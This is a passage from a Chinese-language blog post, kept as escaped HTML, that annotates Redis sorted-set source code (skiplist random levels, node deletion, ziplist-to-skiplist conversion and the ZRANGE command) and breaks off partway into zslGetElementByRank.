&lt;p&gt;　　ziplist添加没啥好说的，skiplist可以稍微提提，大体步骤为四步: &lt;/p&gt;
&lt;p&gt;　　　　1. 找位置, 从最高层开始, 判断是否后继节点小，如果小则直接在本层迭代，否则转到下一层迭代; (每一层都要迭代至相应的位置)&lt;br/&gt;　　　　2. 计算得到一新的随机level,用于决定当前节点的层级;&lt;br/&gt;　　　　3. 依次对每一层与原跳表做关联;&lt;br/&gt;　　　　4. 设置backward指针;（双向链表）&lt;/p&gt;
&lt;p&gt;　　相对说，skiplist 还是有点抽象，我们画个图来描述下上面的操作：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/830731/202002/830731-20200202220118420-1441493439.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 补充，我们看一下随机level的计算算法
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Returns a random level for the new skiplist node we are going to create.
 * The return value of this function is between 1 and ZSKIPLIST_MAXLEVEL
 * (both inclusive), with a powerlaw-alike distribution where higher
 * levels are less likely to be returned. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; zslRandomLevel(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;) {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; level = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; n次随机值得到 level, ZSKIPLIST_P:0.25
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 按随机概率，应该是有1/4的命中概率（如果不是呢？？）&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt; ((random()&amp;amp;&lt;span&gt;0xFFFF&lt;/span&gt;) &amp;lt; (ZSKIPLIST_P * &lt;span&gt;0xFFFF&lt;/span&gt;&lt;span&gt;))
        level &lt;/span&gt;+= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (level&amp;lt;ZSKIPLIST_MAXLEVEL) ?&lt;span&gt; level : ZSKIPLIST_MAXLEVEL;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　先看插入过程的目的，主要是为了先理解 skiplist 的构造过程。而在zset的更新过程，是先删除原节点，再进行插入的这么个过程。所以咱们还是有必要再来看看 skiplist 的删除节点过程。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, 删除skiplist的指定节点&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Delete an element with matching score/element from the skiplist.
 * The function returns 1 if the node was found and deleted, otherwise
 * 0 is returned.
 *
 * If 'node' is NULL the deleted node is freed by zslFreeNode(), otherwise
 * it is not freed (but just unlinked) and *node is set to the node pointer,
 * so that it is possible for the caller to reuse the node (including the
 * referenced SDS string at node-&amp;gt;ele). &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; zslDelete(zskiplist *zsl, &lt;span&gt;double&lt;/span&gt; score, sds ele, zskiplistNode **&lt;span&gt;node) {
    zskiplistNode &lt;/span&gt;*update[ZSKIPLIST_MAXLEVEL], *&lt;span&gt;x;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;

    x &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;header;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 与添加时查找对应位置一样，先进行遍历，找到最每个层级最接近 node 的位置&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span&gt;0&lt;/span&gt;; i--&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (x-&amp;gt;level[i].forward &amp;amp;&amp;amp;&lt;span&gt;
                (x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score &amp;lt; score ||&lt;span&gt;
                    (x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score == score &amp;amp;&amp;amp;&lt;span&gt;
                     sdscmp(x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;ele,ele) &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)))
        {
            x &lt;/span&gt;= x-&amp;gt;&lt;span&gt;level[i].forward;
        }
        update[i] &lt;/span&gt;=&lt;span&gt; x;
    }
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; We may have multiple elements with the same score, what we need
     * is to find the element with both the right score and object. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 进行精确比对，相同才进行删除&lt;/span&gt;
    x = x-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (x &amp;amp;&amp;amp; score == x-&amp;gt;score &amp;amp;&amp;amp; sdscmp(x-&amp;gt;ele,ele) == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行删除动作&lt;/span&gt;
&lt;span&gt;        zslDeleteNode(zsl, x, update);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;node)
            zslFreeNode(x);
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
            *node =&lt;span&gt; x;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; not found &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除 x对应的节点
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; update 是node的每一层级对应的前驱节点&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Internal function used by zslDelete, zslDeleteByScore and zslDeleteByRank &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zslDeleteNode(zskiplist *zsl, zskiplistNode *x, zskiplistNode **&lt;span&gt;update) {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; zsl-&amp;gt;level; i++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (update[i]-&amp;gt;level[i].forward ==&lt;span&gt; x) {
            update[i]&lt;/span&gt;-&amp;gt;level[i].span += x-&amp;gt;level[i].span - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            update[i]&lt;/span&gt;-&amp;gt;level[i].forward = x-&amp;gt;&lt;span&gt;level[i].forward;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不相等说明该层不存在指向 x 的引用&lt;/span&gt;
            update[i]-&amp;gt;level[i].span -= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 更新第0层尾节点指针&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (x-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward) {
        x&lt;/span&gt;-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;].forward-&amp;gt;backward = x-&amp;gt;&lt;span&gt;backward;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        zsl&lt;/span&gt;-&amp;gt;tail = x-&amp;gt;&lt;span&gt;backward;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 降低 skiplist 的层级，直到第一个非空的节点为止&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;(zsl-&amp;gt;level &amp;gt; &lt;span&gt;1&lt;/span&gt; &amp;amp;&amp;amp; zsl-&amp;gt;header-&amp;gt;level[zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;].forward ==&lt;span&gt; NULL)
        zsl&lt;/span&gt;-&amp;gt;level--&lt;span&gt;;
    zsl&lt;/span&gt;-&amp;gt;length--&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　skiplist 删除过程的示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/830731/202002/830731-20200202220303261-1403395409.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　最后，我们再来看另一种情况，即zset发生编码转换时，是如何做的。即如何从 ziplist 转换到 skiplist 中呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, 编码类型转换&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zsetConvert(robj *zobj, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; encoding) {
    zset &lt;/span&gt;*&lt;span&gt;zs;
    zskiplistNode &lt;/span&gt;*node, *&lt;span&gt;next;
    sds ele;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 编码相同，直接返回&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding == encoding) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ziplist -&amp;gt; skiplist 转换&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_ZIPLIST) {
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zl = zobj-&amp;gt;&lt;span&gt;ptr;
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr, *&lt;span&gt;sptr;
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;vstr;
        unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; vlen;
        &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; &lt;span&gt;long&lt;/span&gt;&lt;span&gt; vlong;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (encoding !=&lt;span&gt; OBJ_ENCODING_SKIPLIST)
            serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown target encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        zs &lt;/span&gt;= zmalloc(&lt;span&gt;sizeof&lt;/span&gt;(*&lt;span&gt;zs));
        zs&lt;/span&gt;-&amp;gt;dict = dictCreate(&amp;amp;&lt;span&gt;zsetDictType,NULL);
        zs&lt;/span&gt;-&amp;gt;zsl =&lt;span&gt; zslCreate();

        eptr &lt;/span&gt;= ziplistIndex(zl,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        serverAssertWithInfo(NULL,zobj,eptr &lt;/span&gt;!=&lt;span&gt; NULL);
        sptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,eptr);
        serverAssertWithInfo(NULL,zobj,sptr &lt;/span&gt;!=&lt;span&gt; NULL);

        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (eptr !=&lt;span&gt; NULL) {
            score &lt;/span&gt;=&lt;span&gt; zzlGetScore(sptr);
            serverAssertWithInfo(NULL,zobj,ziplistGet(eptr,&lt;/span&gt;&amp;amp;vstr,&amp;amp;vlen,&amp;amp;&lt;span&gt;vlong));
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (vstr ==&lt;span&gt; NULL)
                ele &lt;/span&gt;=&lt;span&gt; sdsfromlonglong(vlong);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                ele &lt;/span&gt;= sdsnewlen((&lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)vstr,vlen);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 依次插入 skiplist 和 dict 中即可&lt;/span&gt;
            node = zslInsert(zs-&amp;gt;&lt;span&gt;zsl,score,ele);
            serverAssert(dictAdd(zs&lt;/span&gt;-&amp;gt;dict,ele,&amp;amp;node-&amp;gt;score) ==&lt;span&gt; DICT_OK);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; zzlNext 封装了同时迭代 eptr 和 sptr 方法&lt;/span&gt;
            zzlNext(zl,&amp;amp;eptr,&amp;amp;&lt;span&gt;sptr);
        }

        zfree(zobj&lt;/span&gt;-&amp;gt;&lt;span&gt;ptr);
        zobj&lt;/span&gt;-&amp;gt;ptr =&lt;span&gt; zs;
        zobj&lt;/span&gt;-&amp;gt;encoding =&lt;span&gt; OBJ_ENCODING_SKIPLIST;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; skiplist -&amp;gt; ziplist 逆向转换&lt;/span&gt;
    &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_SKIPLIST) {
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zl =&lt;span&gt; ziplistNew();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (encoding !=&lt;span&gt; OBJ_ENCODING_ZIPLIST)
            serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown target encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Approach similar to zslFree(), since we want to free the skiplist at
         * the same time as creating the ziplist. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        zs &lt;/span&gt;= zobj-&amp;gt;&lt;span&gt;ptr;
        dictRelease(zs&lt;/span&gt;-&amp;gt;&lt;span&gt;dict);
        node &lt;/span&gt;= zs-&amp;gt;zsl-&amp;gt;header-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
        zfree(zs&lt;/span&gt;-&amp;gt;zsl-&amp;gt;&lt;span&gt;header);
        zfree(zs&lt;/span&gt;-&amp;gt;&lt;span&gt;zsl);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 正向迭代转换&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;&lt;span&gt; (node) {
            zl &lt;/span&gt;= zzlInsertAt(zl,NULL,node-&amp;gt;ele,node-&amp;gt;&lt;span&gt;score);
            next &lt;/span&gt;= node-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
            zslFreeNode(node);
            node &lt;/span&gt;=&lt;span&gt; next;
        }

        zfree(zs);
        zobj&lt;/span&gt;-&amp;gt;ptr =&lt;span&gt; zl;
        zobj&lt;/span&gt;-&amp;gt;encoding =&lt;span&gt; OBJ_ENCODING_ZIPLIST;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown sorted set encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 基于ziplist, 同时迭代 ele-score&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Move to next entry based on the values in eptr and sptr. Both are set to
 * NULL when there is no next entry. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zzlNext(unsigned &lt;span&gt;char&lt;/span&gt; *zl, unsigned &lt;span&gt;char&lt;/span&gt; **eptr, unsigned &lt;span&gt;char&lt;/span&gt; **&lt;span&gt;sptr) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *_eptr, *&lt;span&gt;_sptr;
    serverAssert(&lt;/span&gt;*eptr != NULL &amp;amp;&amp;amp; *sptr !=&lt;span&gt; NULL);

    _eptr &lt;/span&gt;= ziplistNext(zl,*&lt;span&gt;sptr);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_eptr !=&lt;span&gt; NULL) {
        _sptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,_eptr);
        serverAssert(_sptr &lt;/span&gt;!=&lt;span&gt; NULL);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; No next entry. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        _sptr &lt;/span&gt;=&lt;span&gt; NULL;
    }

    &lt;/span&gt;*eptr =&lt;span&gt; _eptr;
    &lt;/span&gt;*sptr =&lt;span&gt; _sptr;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　至此，整个添加过程结束。本身是不太复杂的，主要针对 ziplist 和 skiplist 的分别处理（注意有逆向编码）。但为了讲清整体关系，稍显杂乱。&lt;/p&gt;

&lt;p&gt;三、zrange 范围查询&lt;/p&gt;
&lt;p&gt;　　范围查询功能，redis提供了好几个，zrange/zrangebyscore/zrangebylex... 应该说查询方式都不太一样，不过我们也不必纠结这些，只管理会大概就行。就挑一个以 下标进行范围查询的实现讲解下就行。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;83&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用法: ZRANGE key start stop [WITHSCORES]
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zrangeCommand(client *&lt;span&gt;c) {
    zrangeGenericCommand(c,&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
}

&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; zrangeGenericCommand(client *c, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; reverse) {
    robj &lt;/span&gt;*key = c-&amp;gt;argv[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
    robj &lt;/span&gt;*&lt;span&gt;zobj;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; withscores = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;long&lt;/span&gt;&lt;span&gt; start;
    &lt;/span&gt;&lt;span&gt;long&lt;/span&gt;&lt;span&gt; end;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; llen;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; rangelen;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((getLongFromObjectOrReply(c, c-&amp;gt;argv[&lt;span&gt;2&lt;/span&gt;], &amp;amp;start, NULL) != C_OK) ||&lt;span&gt;
        (getLongFromObjectOrReply(c, c&lt;/span&gt;-&amp;gt;argv[&lt;span&gt;3&lt;/span&gt;], &amp;amp;end, NULL) != C_OK)) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (c-&amp;gt;argc == &lt;span&gt;5&lt;/span&gt; &amp;amp;&amp;amp; !strcasecmp(c-&amp;gt;argv[&lt;span&gt;4&lt;/span&gt;]-&amp;gt;ptr,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;withscores&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)) {
        withscores &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (c-&amp;gt;argc &amp;gt;= &lt;span&gt;5&lt;/span&gt;&lt;span&gt;) {
        addReply(c,shared.syntaxerr);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((zobj = lookupKeyReadOrReply(c,key,shared.emptymultibulk)) ==&lt;span&gt; NULL
         &lt;/span&gt;|| checkType(c,zobj,OBJ_ZSET)) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Sanitize indexes. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 小于0，则代表反向查询，但实际的输出顺序不是按此值运算的（提供了 reverse 方法）&lt;/span&gt;
    llen =&lt;span&gt; zsetLength(zobj);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;lt; &lt;span&gt;0&lt;/span&gt;) start = llen+&lt;span&gt;start;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (end &amp;lt; &lt;span&gt;0&lt;/span&gt;) end = llen+&lt;span&gt;end;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;lt; &lt;span&gt;0&lt;/span&gt;) start = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Invariant: start &amp;gt;= 0, so this test will be true when end &amp;lt; 0.
     * The range is empty when start &amp;gt; end or start &amp;gt;= length. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (start &amp;gt; end || start &amp;gt;=&lt;span&gt; llen) {
        addReply(c,shared.emptymultibulk);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (end &amp;gt;= llen) end = llen-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    rangelen &lt;/span&gt;= (end-start)+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Return the result in form of a multi-bulk reply &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    addReplyMultiBulkLen(c, withscores &lt;/span&gt;? (rangelen*&lt;span&gt;2&lt;/span&gt;&lt;span&gt;) : rangelen);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同样，分 ZIPLIST 和 SKIPLIST 编码分别实现&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_ZIPLIST) {
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zl = zobj-&amp;gt;&lt;span&gt;ptr;
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr, *&lt;span&gt;sptr;
        unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;vstr;
        unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; vlen;
        &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; &lt;span&gt;long&lt;/span&gt;&lt;span&gt; vlong;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ziplist 以 ele-score 方式存储，所以步长是 2&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (reverse)
            eptr &lt;/span&gt;= ziplistIndex(zl,-&lt;span&gt;2&lt;/span&gt;-(&lt;span&gt;2&lt;/span&gt;*&lt;span&gt;start));
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            eptr &lt;/span&gt;= ziplistIndex(zl,&lt;span&gt;2&lt;/span&gt;*&lt;span&gt;start);

        serverAssertWithInfo(c,zobj,eptr &lt;/span&gt;!=&lt;span&gt; NULL);
        sptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,eptr);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 依次迭代输出&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (rangelen--&lt;span&gt;) {
            serverAssertWithInfo(c,zobj,eptr &lt;/span&gt;!= NULL &amp;amp;&amp;amp; sptr !=&lt;span&gt; NULL);
            serverAssertWithInfo(c,zobj,ziplistGet(eptr,&lt;/span&gt;&amp;amp;vstr,&amp;amp;vlen,&amp;amp;&lt;span&gt;vlong));
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (vstr ==&lt;span&gt; NULL)
                addReplyBulkLongLong(c,vlong);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                addReplyBulkCBuffer(c,vstr,vlen);

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (withscores)
                addReplyDouble(c,zzlGetScore(sptr));
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ziplist 提供正向迭代，返回迭代功能，其实就是 offset的加减问题&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (reverse)
                zzlPrev(zl,&lt;/span&gt;&amp;amp;eptr,&amp;amp;&lt;span&gt;sptr);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                zzlNext(zl,&lt;/span&gt;&amp;amp;eptr,&amp;amp;&lt;span&gt;sptr);
        }

    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_SKIPLIST) {
        zset &lt;/span&gt;*zs = zobj-&amp;gt;&lt;span&gt;ptr;
        zskiplist &lt;/span&gt;*zsl = zs-&amp;gt;&lt;span&gt;zsl;
        zskiplistNode &lt;/span&gt;*&lt;span&gt;ln;
        sds ele;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Check if starting point is trivial, before doing log(N) lookup. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 反向使用 tail 迭代，否则使用header迭代&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (reverse) {
            ln &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;tail;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取下标元素应该只是一个迭代循环问题,不过还是稍微细看一下skiplist实现&lt;/span&gt;
                ln = zslGetElementByRank(zsl,llen-&lt;span&gt;start);
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            ln &lt;/span&gt;= zsl-&amp;gt;header-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                ln &lt;/span&gt;= zslGetElementByRank(zsl,start+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(rangelen--&lt;span&gt;) {
            serverAssertWithInfo(c,zobj,ln &lt;/span&gt;!=&lt;span&gt; NULL);
            ele &lt;/span&gt;= ln-&amp;gt;&lt;span&gt;ele;
            addReplyBulkCBuffer(c,ele,sdslen(ele));
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (withscores)
                addReplyDouble(c,ln&lt;/span&gt;-&amp;gt;&lt;span&gt;score);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 直接正向或反向迭代即可&lt;/span&gt;
            ln = reverse ? ln-&amp;gt;backward : ln-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
        }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown sorted set encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据排名查找元素&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Finds an element by its rank. The rank argument needs to be 1-based. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
zskiplistNode&lt;/span&gt;* zslGetElementByRank(zskiplist *zsl, unsigned &lt;span&gt;long&lt;/span&gt;&lt;span&gt; rank) {
    zskiplistNode &lt;/span&gt;*&lt;span&gt;x;
